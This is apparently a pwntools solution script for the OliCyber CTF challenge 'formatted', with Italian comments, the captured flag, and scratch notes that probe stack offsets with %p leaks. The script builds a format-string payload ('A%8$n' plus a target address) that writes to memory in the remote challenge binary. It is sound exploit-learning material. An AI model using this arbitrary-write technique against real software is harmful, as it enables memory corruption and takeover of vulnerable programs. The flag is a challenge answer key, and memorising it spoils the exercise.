from pwn import *
#con = process('./formatted')
#con = gdb.debug('./formatted', 'c')

#a printf manca lo specificatore di formato

r=remote("formatted.challs.olicyber.it", 10305)

payload = 'A%8$n'
payload = payload.ljust(16, 'X')
payload += p64(0x0040404c).decode()

r.sendline(payload)

r.interactive()

#flag{So_y0U_kn0w_F0rm4t_StR1ng5}


'''
Hello, what's your name?
%p%p%p%p%p%p%p%p%p%p
0x7fd1dc419b230xfbad208b0x7fd1dc314992(nil)(nil)0x70257025702570250x70257025702570250xa702570250x640x1000

That is a nice name!!
Hello, what's your name?
%p%p%p%p%p%p%p%p%p%pAAAAAAAA
0x7f9540619b230xfbad208b0x7f9540514992(nil)(nil)0x70257025702570250x70257025702570250x41414141702570250xa414141410x1000AAAAAAAA

That is a nice name!!
-------------- 
payload = '%p'*8
payload = payload.ljust(16, 'X')
-----
payload = '%p'*6
>>> payload = payload.ljust(16, 'X')
>>> payload
'%p%p%p%p%p%pXXXX'
--------
Hello, what's your name?
%p%p%p%p%p%p%p%pAAAAAAAA
0x7f9915819b230xfbad208b0x7f9915714992(nil)(nil)0x70257025702570250x70257025702570250x4141414141414141AAAAAAAA

That is a nice name!!
Mazza — Ieri alle 15:44
------
payload = '%8$p'
payload = payload.ljust(16, 'X')
payload += 'A'*8
Mazza — Ieri alle 15:55
-----
[] Switching to interactive mode
[] Process './formatted' stopped with exit code 0 (pid 15395)
0x40404cXXXXXXXXXXXXL@@
That is a nice name!!
[*] Got EOF while reading in interactive
---
from pwn import *
con = process('./formatted')

#con = gdb.debug('./formatted', 'c')

payload = '%8$p'
payload = payload.ljust(16, 'X')
payload += p64(0x0040404c).decode() 
-----
payload = '%8$n'
payload = payload.ljust(16, 'X')
payload += p64(0x0040404c).decode()
----
payload = 'A%8$n'
payload = payload.ljust(16, 'X')
payload += p64(0x0040404c).decode()'''